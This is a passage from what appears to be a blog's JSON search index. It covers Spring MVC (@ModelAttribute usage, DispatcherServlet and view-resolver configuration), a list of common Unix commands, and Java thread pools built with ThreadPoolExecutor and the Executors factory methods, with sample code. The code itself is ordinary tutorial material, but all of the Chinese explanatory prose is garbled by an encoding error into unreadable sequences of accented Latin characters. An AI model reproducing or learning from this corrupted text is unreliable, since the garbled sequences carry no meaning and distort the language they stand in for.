‡æ–¹æ³•(update)å‰æ‰§è¡Œã€‚ModelAttributeå¯ä»¥å–å‡ºéšå«å¯¹è±¡çš„å€¼@ModelAttribute public void TestModelAttribute(Map&lt;String, Object&gt; map){ POJO pojo = new POJO(&quot;kayleh&quot;, 1104); map.put(&quot;value&quot;,pojo); System.out.println(&quot;modelAttributeæ–¹æ³•...); } @RequestMapping(&quot;/updateBook&quot;) public String updateBook(@RequestParam(value=&quot;author&quot;)String author, Map&lt;String, Object&gt; model, HttpServletRequest request, @ModelAttribute(&quot;value&quot;)POJO pojo ){ System.out.println(pojo); return &quot;ok&quot;; } @ModelAttribute(â€œvalueâ€)è¿™é‡Œå¦‚æœæŒ‡å®šçš„â€valueâ€,valueå°±æ˜¯ä»mapå–å‡ºå‚æ•°çš„key.å¦‚æœæ˜¯@ModelAttribute,æ²¡æœ‰æŒ‡å®škey,SpringMVCä¼šé»˜è®¤ä½¿ç”¨è¿”å›å€¼ç±»å‹çš„é¦–å­—æ¯å°å†™ä½œä¸ºkey.å¦‚pOJO.","categories":[{"name":"SpringMVC","slug":"SpringMVC","permalink":"https://blog.kayleh.top/categories/SpringMVC/"}],"tags":[{"name":"frame","slug":"frame","permalink":"https://blog.kayleh.top/tags/frame/"}]},{"title":"Springæ¶æ„","slug":"Springæ¶æ„","date":"2020-04-19T04:40:54.000Z","updated":"2021-04-11T17:11:28.451Z","comments":true,"path":"Springæ¶æ„/","link":"","permalink":"https://blog.kayleh.top/Spring%E6%9E%B6%E6%9E%84/","excerpt":"æ¶æ„å›¾","text":"æ¶æ„å›¾","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://blog.kayleh.top/tags/frame/"}]},{"title":"unixçš„å¸¸ç”¨æŒ‡ä»¤","slug":"unix","date":"2019-12-13T21:30:23.000Z","updated":"2021-04-11T17:11:28.536Z","comments":true,"path":"unix/","link":"","permalink":"https://blog.kayleh.top/unix/","excerpt":"unixçš„å¸¸ç”¨æŒ‡ä»¤","text":"unixçš„å¸¸ç”¨æŒ‡ä»¤ ls æ˜¾ç¤ºæŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ç›®å½•æ¸…å•ç›¸å½“äºdosä¸‹çš„dirå‘½ä»¤ã€‚ pwd æ˜¾ç¤ºå½“å‰ç›®å½•ã€‚ mkdir åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºç›®å½•ã€‚ rm åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ã€‚ cp å¤åˆ¶æ–‡ä»¶ã€‚ mv ç§»åŠ¨æ–‡ä»¶ã€‚ cd åˆ‡æ¢å·¥ä½œç›®å½•ã€‚ ps æŸ¥çœ‹è¿›ç¨‹ã€‚ ftp ä¼ é€æ–‡ä»¶ã€‚ telnet è¿œç¨‹ç™»å½•å‘½ä»¤ã€‚ ping ç”¨æ¥æµ‹è¯•æœ¬æœºä¸ç›®æ ‡ä¸»æœºæ˜¯å¦è”é€šã€‚ env æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸­çš„ç¯å¢ƒå˜é‡ã€‚ more åˆ†å±æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„å†…å®¹ã€‚ echoåœ¨ç»ˆç«¯ä¸Šæ˜¾ç¤ºä½ è¦æ˜¾ç¤ºçš„å†…å®¹ï¼Œå‘Cè¯­è¨€ä¸­çš„printfå‡½æ•°ã€‚ å¾®ä¿¡å…¬ä¼—å·:æ¯æ—¥å­¦ä¹ å¹²è´§","categories":[],"tags":[]},{"title":"SpringMVCç¯å¢ƒæ­å»º","slug":"SpringMVCç¯å¢ƒæ­å»º","date":"2019-07-13T21:30:23.000Z","updated":"2021-04-11T17:11:28.441Z","comments":true,"path":"SpringMVCç¯å¢ƒæ­å»º/","link":"","permalink":"https://blog.kayleh.top/SpringMVC%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"SpringMVC","text":"SpringMVC Spring MVCæ˜¯Spring Frameworkçš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯åŸºäºJavaå®ç°MVCçš„è½»é‡çº§Webæ¡†æ¶ï¼Œå®ç°MVCæ¨¡å—ï¼Œç®€åŒ–äº†Webå¼€å‘ã€‚ MVCæå€¡æ¯ä¸€å±‚åªå†™è‡ªå·±çš„ä¸œè¥¿ï¼Œä¸å†™å…¶ä»–ä»»ä½•ä»£ç ã€‚ä¸ºäº†è§£è€¦ï¼Œä¸ºäº†ç»´æŠ¤æ–¹ä¾¿å’Œåˆ†å·¥åˆä½œã€‚ SpringMVCä¸ºå±•ç°å±‚æä¾›çš„åŸºäºMVCè®¾è®¡ç†å¿µçš„ä¼˜ç§€Webæ¡†æ¶ï¼Œæ˜¯ç›®å‰æœ€ä¸»æµçš„æ¡†æ¶ä¹‹ä¸€ã€‚ ç¯å¢ƒæ­å»º1.å¯¼åŒ…(Mavenå·¥ç¨‹å¿½ç•¥) éœ€è¦å¯¼å…¥logåŒ…ï¼Œspringæ ¸å¿ƒåŒ…ï¼ŒSpringMVCåŒ… 1.junit-x.x.x.jar 2.spring-webmvc-x.x.x.RELEASE.jar 3.spring-aop-x.x.x.RELEASE.jar 4.spring-beans-x.x.x.RELEASE.jar 5.spring-context-x.x.x.RELEASE.jar 6.spring-core-x.x.x.RELEASE.jar 7.spring-expression-x.x.x.RELEASE.jar 8.spring-web-x.x.x.RELEASE.jar 9.commons-log-.x.x.x.RELEASE.jar å†™é…ç½® /** * web.xml */ &lt;servlet&gt; &lt;servlet-name&gt;springDispatcherServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;!-- contextConfigLocationï¼šæŒ‡å®šSpringMVCé…ç½®æ–‡ä»¶ä½ç½® --&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:springmvc.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;springDispatcherServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; =========================================================== /** * springmvc.xml */ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd&quot;&gt; &lt;!-- è¿™é‡Œæ˜¯æ‰«ææ‰€æœ‰ç»„ä»¶ --&gt; &lt;context:component-scan base-package=&quot;com.wizard&quot;&gt;&lt;/context:component-scan&gt; &lt;!-- é…ç½®ä¸€ä¸ªè§†å›¾è§£æå™¨ ä½œç”¨æ˜¯æ‹¼æ¥é¡µé¢çš„åœ°å€ï¼Œæ–¹ä¾¿è°ƒç”¨--&gt; &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt; &lt;!--å‰ç¼€--&gt; &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/page/&quot;&gt;&lt;/property&gt; &lt;!--åç¼€--&gt; &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;&gt;&lt;/property&gt; &lt;/bean&gt; &lt;/beans&gt; /* *viewå±‚ */ &lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt; &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;Insert title here&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;æ¥äº†!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; æ§åˆ¶å™¨å±‚ /** * @author Kayleh * @Controller:æ ‡è¯†å“ªä¸ªç»„ä»¶æ˜¯æ§åˆ¶å™¨ *@RequestMapping * å‘Šè¯‰SpringMVCï¼Œè¿™ä¸ªæ–¹æ³•ç”¨æ¥å¤„ç†ä»€ä¹ˆè¯·æ±‚; */ @Controller public class firstController {//è¿™æ˜¯ä¸€æ¬¡è½¬å‘æ“ä½œ @RequestMapping(&quot;/hello&quot;) public String firstRequest(){ System.out.println(&quot;æ”¶åˆ°è¯·æ±‚&quot;); return &quot;success&quot;; } } index.jsp &lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt; &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;Insert title here&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=&quot;hello&quot;&gt;Hello bug&lt;/a&gt; &lt;/body&gt; &lt;/html&gt; è¿è¡Œç»“æœHello bug å…¶ä»–ç»†èŠ‚ç»†èŠ‚ï¼š@RequestMappingæ³¨è§£ä¸ä»…å¯ä»¥å†™åœ¨æ–¹æ³•å‰,è¿˜å¯ä»¥å†™åœ¨ç±»å‰,å¦‚æœå†™åœ¨ç±»å‰,æ„æ€ä¸ºå½“å‰ç±»æ‰€æœ‰çš„æ–¹æ³•çš„è¯·æ±‚åœ°å€æŒ‡å®šä¸€ä¸ªåŸºå‡†è·¯å¾„,è®¿é—®firstRequestæ–¹æ³•çš„è·¯å¾„ä¸º/ç±»å‰çš„æ³¨è§£/æ–¹æ³•çš„æ³¨è§£(/hello). @RequestMappingæ³¨è§£çš„å‚æ•°(â€œ/helloâ€)çš„/å¯ä»¥ä¸å†™,ä½†ä¹ æƒ¯ä¸ºäº†æ–¹ä¾¿ç»´æŠ¤åº”è¯¥å†™ä¸Š. æ§åˆ¶å™¨å¤„ç†çš„è¯·æ±‚ firstController æ˜¯è¯·æ±‚è½¬å‘æ“ä½œ,Tomcatè®¿é—®åœ°å€æ ä¸å˜ å¦‚æœå‰ç«¯æ§åˆ¶å™¨æ²¡æœ‰æŒ‡å®šé…ç½®æ–‡ä»¶ä½ç½®,Springä¹Ÿä¼šåœ¨/WEB-INF/xxx-servlet.xmlè·¯å¾„ä¸‹æŸ¥æ‰¾æ–‡ä»¶.xxxä¸ºweb.xmlé…ç½®çš„å‰ç«¯æ§åˆ¶å™¨ è¯¦ç»†æµç¨‹ 1.å®¢æˆ·ç«¯ç‚¹å‡»é“¾æ¥ä¼šå‘é€http://localhost:8080/springmvc/helloè¯·æ±‚ 2.æ¥åˆ°TomcatæœåŠ¡å™¨ 3.springMVCçš„å‰ç«¯æ§åˆ¶å™¨æ”¶åˆ°æ‰€æœ‰è¯·æ±‚ 4.çœ‹è¯·æ±‚åœ°å€å’Œ@RequestMappingæ ‡æ³¨çš„å“ªä¸ªåŒ¹é…,æ¥æ‰¾åˆ°ä½¿ç”¨ä»€ä¹ˆç±»çš„ä»€ä¹ˆæ–¹æ³• 5.å‰ç«¯æ§åˆ¶å™¨æ‰¾åˆ°äº†ç›®æ ‡å¤„ç†å™¨ç±»å’Œç›®æ ‡æ–¹æ³•,ç›´æ¥åˆ©ç”¨åå°„æ‰§è¡Œç›®æ ‡æ–¹æ³• 6.æ–¹æ³•æ‰§è¡Œå®Œæˆä¹‹åä¼šæœ‰ä¸€ä¸ªè¿”å›å€¼;SpringMVCè®¤ä¸ºè¿™ä¸ªè¿”å›å€¼å°±æ˜¯è¦å»çš„é¡µé¢ 7.æ‹¿åˆ°æ–¹æ³•è¿”å›å€¼å,ç”¨è§†å›¾è§£æå™¨è¿›è¡Œæ‹¼ä¸²å¾—åˆ°å®Œæ•´çš„é¡µé¢åœ°å€ 8.æ‹¿åˆ°é¡µé¢åœ°å€,å‰ç«¯æ§åˆ¶å™¨è½¬å‘åˆ°é¡µé¢ å…¶ä»–é—®é¢˜?1ä¸ºä»€ä¹ˆweb.xmlä¸­é…ç½®çš„æ‹¦æˆªä¸º &lt;servlet-mapping&gt; &lt;servlet-name&gt;springDispatcherServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; ä¸ºä»€ä¹ˆæ²¡æœ‰æ‹¦æˆªindex.jsp?? å› ä¸ºTomcatçš„åº•å±‚æœ¬æ¥å°±èƒ½æ‹¦æˆªjspé¡µé¢,é…ç½®çš„â€/â€œçš„å­ç±»web.xmlç›¸å½“äºè¦†ç›–äº†Webappçš„çˆ¶ç±»web.xmlä¸­çš„DefaultServlet,DefaultServletçš„ä½œç”¨æ˜¯å¤„ç†é™æ€èµ„æº,è¦†ç›–äº†DefaultServlet,ä¹Ÿå°±æ‹¦æˆªäº†é™¤jspå’Œservletå¤–çš„é™æ€èµ„æº,è€ŒJspServletçš„é…ç½®å¹¶æ²¡æœ‰è¦†ç›–. è€Œâ€/*â€çš„ä½œç”¨æ˜¯æ‹¦æˆªæ‰€æœ‰è¯·æ±‚,åŒ…æ‹¬jspé¡µé¢.","categories":[{"name":"SpringMVC","slug":"SpringMVC","permalink":"https://blog.kayleh.top/categories/SpringMVC/"}],"tags":[{"name":"frame","slug":"frame","permalink":"https://blog.kayleh.top/tags/frame/"}]},{"title":"concurrency-principle","slug":"å¹¶å‘ï¼šåŸç†","date":"2018-12-31T21:30:23.000Z","updated":"2021-04-11T17:11:28.864Z","comments":true,"path":"å¹¶å‘ï¼šåŸç†/","link":"","permalink":"https://blog.kayleh.top/%E5%B9%B6%E5%8F%91%EF%BC%9A%E5%8E%9F%E7%90%86/","excerpt":"å¤šçº¿ç¨‹ä¸ºä»€ä¹ˆè¦åˆ›å»ºçº¿ç¨‹æ± å¦‚æœç³»ç»Ÿè¦è¿è¡Œå¤šä¸ªçº¿ç¨‹,å¤§é‡åå¤çš„å¯åŠ¨åˆ›å»ºå’Œå›æ”¶çº¿ç¨‹ä¼šéå¸¸å ç”¨ç³»ç»Ÿèµ„æº,å¯¼è‡´æ€§èƒ½ä¸‹é™.","text":"å¤šçº¿ç¨‹ä¸ºä»€ä¹ˆè¦åˆ›å»ºçº¿ç¨‹æ± å¦‚æœç³»ç»Ÿè¦è¿è¡Œå¤šä¸ªçº¿ç¨‹,å¤§é‡åå¤çš„å¯åŠ¨åˆ›å»ºå’Œå›æ”¶çº¿ç¨‹ä¼šéå¸¸å ç”¨ç³»ç»Ÿèµ„æº,å¯¼è‡´æ€§èƒ½ä¸‹é™. åˆ›å»ºçº¿ç¨‹æ± ,å¯ä»¥:1.é™ä½èµ„æºæ¶ˆè€—2.æå‡å“åº”é€Ÿåº¦3.æé«˜ çº¿ç¨‹æ± åŸç† çº¿ç¨‹æ± ä¸€èˆ¬ç”±ä¸¤ç§è§’è‰²æ„æˆï¼šå¤šä¸ªå·¥ä½œçº¿ç¨‹ å’Œ ä¸€ä¸ªé˜»å¡é˜Ÿåˆ—ã€‚ å·¥ä½œçº¿ç¨‹ :å·¥ä½œçº¿ç¨‹æ˜¯ä¸€ç»„å·²ç»å¤„åœ¨è¿è¡Œä¸­çš„çº¿ç¨‹ï¼Œå®ƒä»¬ä¸æ–­åœ°å‘é˜»å¡é˜Ÿåˆ—ä¸­é¢†å–ä»»åŠ¡æ‰§è¡Œã€‚ é˜»å¡é˜Ÿåˆ— :é˜»å¡é˜Ÿåˆ—ç”¨äºå­˜å‚¨å·¥ä½œçº¿ç¨‹æ¥ä¸åŠå¤„ç†çš„ä»»åŠ¡ã€‚å½“å·¥ä½œçº¿ç¨‹éƒ½åœ¨æ‰§è¡Œä»»åŠ¡æ—¶ï¼Œåˆ°æ¥çš„æ–°ä»»åŠ¡å°±åªèƒ½æš‚æ—¶åœ¨é˜»å¡é˜Ÿåˆ—ä¸­å­˜å‚¨ã€‚ æäº¤ä¸€ä¸ªä»»åŠ¡åˆ°çº¿ç¨‹æ± ä¸­,çº¿ç¨‹æ± çš„å¤„ç†æµç¨‹å¦‚ä¸‹: 1.åˆ¤æ–­çº¿ç¨‹æ± é‡Œçš„æ ¸å¿ƒçº¿ç¨‹æ˜¯å¦éƒ½åœ¨æ‰§è¡Œä»»åŠ¡,å¦‚æœä¸æ˜¯(æ ¸å¿ƒçº¿ç¨‹ç©ºé—²æˆ–è€…æ ¸å¿ƒçº¿ç¨‹æ²¡æœ‰è¢«åˆ›å»º)åˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„å·¥ä½œçº¿ç¨‹æ¥æ‰§è¡Œä»»åŠ¡.å¦‚æœæ ¸å¿ƒçº¿ç¨‹éƒ½åœ¨æ‰§è¡Œä»»åŠ¡,åˆ™è¿›å…¥ä¸‹ä¸ªæµç¨‹. 2.çº¿ç¨‹æ± åˆ¤æ–­å·¥ä½œé˜Ÿåˆ—æ˜¯å¦å·²æ»¡,å¦‚æœå·¥ä½œè·¯å¾„æ²¡æœ‰æ»¡,åˆ™æ–°æäº¤çš„ä»»åŠ¡å‚¨å­˜åœ¨è¿™ä¸ªå·¥ä½œé˜Ÿåˆ—é‡Œ.å¦‚æœå·¥ä½œé˜Ÿåˆ—æ»¡äº†,åˆ™è¿›å…¥ä¸‹ä¸ªæµç¨‹. 3.åˆ¤æ–­çº¿ç¨‹æ± é‡Œçš„çº¿ç¨‹æ˜¯å¦éƒ½å¤„äºå·¥ä½œçŠ¶æ€,å¦‚æœæ²¡æœ‰,åˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„å·¥ä½œçº¿ç¨‹æ¥æ‰§è¡Œä»»åŠ¡.å¦‚æœå·²ç»æ»¡äº†,åˆ™äº¤ç»™é¥±å’Œç­–ç•¥æ¥å¤„ç†è¿™ä¸ªä»»åŠ¡. çº¿ç¨‹æ± çš„åˆ†ç±»public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler); ThreadPoolExecutoræ˜¯çº¿ç¨‹æ± çš„çœŸæ­£å®ç°,ä»–é€šè¿‡æ„é€ æ–¹æ³•çš„ä¸€ç³»åˆ—å‚æ•°ï¼Œæ¥æ„æˆä¸åŒé…ç½®çš„çº¿ç¨‹æ± ã€‚corePoolSizeï¼š æ ¸å¿ƒæ± çš„å¤§å°ã€‚ å½“æœ‰ä»»åŠ¡æ¥ä¹‹åï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªçº¿ç¨‹å»æ‰§è¡Œä»»åŠ¡ï¼Œå½“çº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹æ•°ç›®è¾¾åˆ°corePoolSizeåï¼Œå°±ä¼šæŠŠåˆ°è¾¾çš„ä»»åŠ¡æ”¾åˆ°ç¼“å­˜é˜Ÿåˆ—å½“ä¸­maximumPoolSizeï¼š çº¿ç¨‹æ± æœ€å¤§çº¿ç¨‹æ•°ï¼Œå®ƒè¡¨ç¤ºåœ¨çº¿ç¨‹æ± ä¸­æœ€å¤šèƒ½åˆ›å»ºå¤šå°‘ä¸ªçº¿ç¨‹ï¼›keepAliveTimeï¼š è¡¨ç¤ºçº¿ç¨‹æ²¡æœ‰ä»»åŠ¡æ‰§è¡Œæ—¶æœ€å¤šä¿æŒå¤šä¹…æ—¶é—´ä¼šç»ˆæ­¢ã€‚unitï¼š å‚æ•°keepAliveTimeçš„æ—¶é—´å•ä½ï¼Œæœ‰7ç§å–å€¼ï¼Œåœ¨TimeUnitç±»ä¸­æœ‰7ç§é™æ€å±æ€§ã€‚workQueueï¼šä¸€ä¸ªé˜»å¡é˜Ÿåˆ—ï¼Œæäº¤çš„ä»»åŠ¡å°†ä¼šè¢«æ”¾åˆ°è¿™ä¸ªé˜Ÿåˆ—é‡Œã€‚threadFactoryï¼šçº¿ç¨‹å·¥å‚ï¼Œç”¨æ¥åˆ›å»ºçº¿ç¨‹ï¼Œä¸»è¦æ˜¯ä¸ºäº†ç»™çº¿ç¨‹èµ·åå­—ï¼Œé»˜è®¤å·¥å‚çš„çº¿ç¨‹åå­—ï¼špool-1-thread-3ã€‚handlerï¼šæ‹’ç»ç­–ç•¥ï¼Œå½“çº¿ç¨‹æ± é‡Œçº¿ç¨‹è¢«è€—å°½ï¼Œä¸”é˜Ÿåˆ—ä¹Ÿæ»¡äº†çš„æ—¶å€™ä¼šè°ƒç”¨ã€‚ çº¿ç¨‹æ± çš„åˆ›å»ºæ–¹æ³•Javaé€šè¿‡Executorsï¼ˆjdk1.5å¹¶å‘åŒ…ï¼‰æä¾›å››ç§çº¿ç¨‹æ± ï¼Œåˆ†åˆ«ä¸ºï¼š newCachedThreadPoolåˆ›å»ºä¸€ä¸ªå¯ç¼“å­˜çº¿ç¨‹æ± ï¼Œå¦‚æœçº¿ç¨‹æ± é•¿åº¦è¶…è¿‡å¤„ç†éœ€è¦ï¼Œå¯çµæ´»å›æ”¶ç©ºé—²çº¿ç¨‹ï¼Œè‹¥æ— å¯å›æ”¶ï¼Œåˆ™æ–°å»ºçº¿ç¨‹ã€‚æ¡ˆä¾‹æ¼”ç¤º: newFixedThreadPool åˆ›å»ºä¸€ä¸ªå®šé•¿çº¿ç¨‹æ± ï¼Œå¯æ§åˆ¶çº¿ç¨‹æœ€å¤§å¹¶å‘æ•°ï¼Œè¶…å‡ºçš„çº¿ç¨‹ä¼šåœ¨é˜Ÿåˆ—ä¸­ç­‰å¾…ã€‚ newScheduledThreadPool åˆ›å»ºä¸€ä¸ªå®šé•¿çº¿ç¨‹æ± ï¼Œæ”¯æŒå®šæ—¶åŠå‘¨æœŸæ€§ä»»åŠ¡æ‰§è¡Œã€‚ newSingleThreadExecutor åˆ›å»ºä¸€ä¸ªå•çº¿ç¨‹åŒ–çš„çº¿ç¨‹æ± ï¼Œå®ƒåªä¼šç”¨å”¯ä¸€çš„å·¥ä½œçº¿ç¨‹æ¥æ‰§è¡Œä»»åŠ¡ï¼Œä¿è¯æ‰€æœ‰ä»»åŠ¡æŒ‰ç…§æŒ‡å®šé¡ºåº(FIFO, LIFO, ä¼˜å…ˆçº§)æ‰§è¡Œã€‚ newCachedThreadPool åˆ›å»ºä¸€ä¸ªå¯ç¼“å­˜çº¿ç¨‹æ± ï¼Œå¦‚æœçº¿ç¨‹æ± é•¿åº¦è¶…è¿‡å¤„ç†éœ€è¦ï¼Œå¯çµæ´»å›æ”¶ç©ºé—²çº¿ç¨‹ï¼Œ è‹¥æ— å¯å›æ”¶ï¼Œåˆ™æ–°å»ºçº¿ç¨‹ã€‚ package cn.qbz.thread; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; public class Test111907 { public static void main(String[] args) { ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; 10; i++) { final int temp = i; executorService.execute(new Runnable() { @Override public void run() { try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + &quot; i=&quot; + temp); } }); } } } public static ExecutorService newCachedThreadPool() { return new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue&lt;Runnable&gt;()); } newFixedThreadPool åˆ›å»ºä¸€ä¸ªå®šé•¿çº¿ç¨‹æ± ï¼Œå¯æ§åˆ¶çº¿ç¨‹æœ€å¤§å¹¶å‘æ•°ï¼Œè¶…å‡ºçš„çº¿ç¨‹ä¼šåœ¨é˜Ÿåˆ—ä¸­ç­‰å¾…ã€‚ package cn.qbz.thread; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; public class Test111907 { public static void main(String[] args) { ExecutorService executorService = Executors.newFixedThreadPool(3); for (int i = 0; i &lt; 10; i++) { final int temp = i; executorService.execute(new Runnable() { @Override public void run() { try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + &quot; i=&quot; + temp); } }); } } } public static ExecutorService newFixedThreadPool(int nThreads) { return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue&lt;Runnable&gt;()); } newScheduledThreadPool åˆ›å»ºä¸€ä¸ªå®šé•¿çº¿ç¨‹æ± ï¼Œæ”¯æŒå®šæ—¶åŠå‘¨æœŸæ€§ä»»åŠ¡æ‰§è¡Œã€‚ package cn.qbz.thread; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.ScheduledExecutorService; import java.util.concurrent.TimeUnit; public class Test111907 { public static void main(String[] args) { final long begin = System.currentTimeMillis(); ExecutorService executorService = Executors.newScheduledThreadPool(3); for (int i = 0; i &lt; 10; i++) { final int temp = i; final long time = begin; executorService.schedule(new Runnable() { @Override public void run() { try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + &quot; i=&quot; + temp + &quot; time=&quot; + (System.currentTimeMillis() - time)); } }, 5, TimeUnit.SECONDS); } } } public static ScheduledExecutorService newScheduledThreadPool(int corePoolSize) { return new ScheduledThreadPoolExecutor(corePoolSize); } public ScheduledThreadPoolExecutor(int corePoolSize) { super(corePoolSize, Integer.MAX_VALUE, 0, TimeUnit.NANOSECONDS, new DelayedWorkQueue()); } newSingleThreadExecutor åˆ›å»ºä¸€ä¸ªå•çº¿ç¨‹åŒ–çš„çº¿ç¨‹æ± ï¼Œå®ƒåªä¼šç”¨å”¯ä¸€çš„å·¥ä½œçº¿ç¨‹æ¥æ‰§è¡Œä»»åŠ¡ï¼Œ ä¿è¯æ‰€æœ‰ä»»åŠ¡æŒ‰ç…§æŒ‡å®šé¡ºåº(FIFO, LIFO, ä¼˜å…ˆçº§)æ‰§è¡Œã€‚ public class Test111907 { public static void main(String[] args) { ExecutorService executorService = Executors.newSingleThreadExecutor(); for (int i = 0; i &lt; 10; i++) { final int temp = i; executorService.execute(new Runnable() { @Override public void run() { try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName() + &quot; i=&quot; + temp); } }); } } } å…³é—­çº¿ç¨‹æ± å…³é—­çº¿ç¨‹æ± æœ‰ä¸¤ç§æ–¹å¼ï¼šshutdownå’ŒshutdownNowï¼Œå…³é—­æ—¶ï¼Œä¼šéå†æ‰€æœ‰çš„çº¿ç¨‹ï¼Œè°ƒç”¨å®ƒä»¬çš„interruptå‡½æ•°ä¸­æ–­çº¿ç¨‹ã€‚ä½†è¿™ä¸¤ç§æ–¹å¼å¯¹äºæ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹å¤„ç†æ–¹å¼ä¸åŒã€‚ shutdown()ä»…åœæ­¢é˜»å¡é˜Ÿåˆ—ä¸­ç­‰å¾…çš„çº¿ç¨‹ï¼Œé‚£äº›æ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹å°±ä¼šè®©ä»–ä»¬æ‰§è¡Œç»“æŸã€‚ shutdownNow()ä¸ä»…ä¼šåœæ­¢é˜»å¡é˜Ÿåˆ—ä¸­çš„çº¿ç¨‹ï¼Œè€Œä¸”ä¼šåœæ­¢æ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹ã€‚ ThreadPoolExecutorè¿è¡Œæœºåˆ¶å½“æœ‰è¯·æ±‚åˆ°æ¥æ—¶ï¼š è‹¥å½“å‰å®é™…çº¿ç¨‹æ•°é‡ å°‘äº corePoolSizeï¼Œå³ä½¿æœ‰ç©ºé—²çº¿ç¨‹ï¼Œä¹Ÿä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„å·¥ä½œçº¿ç¨‹ï¼› è‹¥å½“å‰å®é™…çº¿ç¨‹æ•°é‡å¤„äºcorePoolSizeå’ŒmaximumPoolSizeä¹‹é—´ï¼Œå¹¶ä¸”é˜»å¡é˜Ÿåˆ—æ²¡æ»¡ï¼Œåˆ™ä»»åŠ¡å°†è¢«æ”¾å…¥é˜»å¡é˜Ÿåˆ—ä¸­ç­‰å¾…æ‰§è¡Œï¼› è‹¥å½“å‰å®é™…çº¿ç¨‹æ•°é‡ å°äº maximumPoolSizeï¼Œä½†é˜»å¡é˜Ÿåˆ—å·²æ»¡ï¼Œåˆ™ç›´æ¥åˆ›å»ºæ–°çº¿ç¨‹å¤„ç†ä»»åŠ¡ï¼› è‹¥å½“å‰å®é™…çº¿ç¨‹æ•°é‡å·²ç»è¾¾åˆ°maximumPoolSizeï¼Œå¹¶ä¸”é˜»å¡é˜Ÿåˆ—å·²æ»¡ï¼Œåˆ™ä½¿ç”¨é¥±å’Œç­–ç•¥ã€‚ è®¾ç½®åˆç†çš„çº¿ç¨‹æ± å¤§å°ä»»åŠ¡ä¸€èˆ¬å¯åˆ†ä¸ºï¼šCPUå¯†é›†å‹ã€IOå¯†é›†å‹ã€æ··åˆå‹ï¼Œå¯¹äºä¸åŒç±»å‹çš„ä»»åŠ¡éœ€è¦åˆ†é…ä¸åŒå¤§å°çš„çº¿ç¨‹æ± ã€‚ CPUå¯†é›†å‹ä»»åŠ¡ å°½é‡ä½¿ç”¨è¾ƒå°çš„çº¿ç¨‹æ± ï¼Œä¸€èˆ¬ä¸ºCPUæ ¸å¿ƒæ•°+1ã€‚å› 